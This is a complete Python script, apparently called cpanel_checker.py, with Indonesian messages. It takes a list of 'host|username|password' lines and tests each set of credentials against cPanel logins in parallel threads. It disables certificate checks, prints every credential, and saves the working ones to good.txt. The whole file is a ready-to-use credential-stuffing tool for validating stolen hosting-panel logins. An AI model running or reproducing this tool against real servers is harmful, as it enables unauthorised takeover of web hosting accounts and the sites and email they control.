import re
import sys
import requests
from multiprocessing.dummy import Pool as ThreadPool
from requests.auth import HTTPBasicAuth
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Colors
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA

# Progress file
progress_file = 'progress.txt'

def report_progress(progress):
    with open(progress_file, 'w') as f:
        f.write(f"{progress}\n")

def check_cpanel(site, total_sites, index):
    data_cpanel = site.strip()

    try:
        ip, username, password = site.split('|')
        print(f" [*] Cpanel : {ip}")
        print(f" [*] Username : {username}")
        print(f" [*] Password : {password}")

        session = requests.Session()
        session.verify = False 
        auth = HTTPBasicAuth(username, password)
        response = session.get(ip, auth=auth)

        if "email_accounts" in response.text:
            print(f" {fg}[+] Login successful{Style.RESET_ALL}")
            with open("good.txt", "a") as out:
                out.write(f"{data_cpanel}\n")
        else:
            print(f" {fr}[-] Login Failed {Style.RESET_ALL}")

    except ValueError:
        print(f" {fr} [-] Login Failed: Invalid format {Style.RESET_ALL}")

    except Exception as e:
        print(f" {fr} [-] Login Failed: {e} {Style.RESET_ALL}")

    finally:
        progress = int((index / total_sites) * 100)
        report_progress(progress)

def main(filename, thread_count):
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
            sites = file.read().splitlines()
        
        total_sites = len(sites)
        pool = ThreadPool(thread_count)
        
        for i, site in enumerate(sites):
            pool.apply_async(check_cpanel, args=(site, total_sites, i + 1))
        
        pool.close()
        pool.join()
    except FileNotFoundError:
        print(f'{fr}[ERROR]{Style.RESET_ALL} File {filename} tidak ditemukan.')
    except ValueError:
        print('Masukkan jumlah thread yang valid.')
    except Exception as e:
        print(f'Terjadi kesalahan: {e}')

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python cpanel_checker.py <filename> <thread_count>")
    else:
        filename = sys.argv[1]
        thread_count = int(sys.argv[2])
        print(f"Running cpanel_checker.py with file: {filename} and threads: {thread_count}")
        main(filename, thread_count)
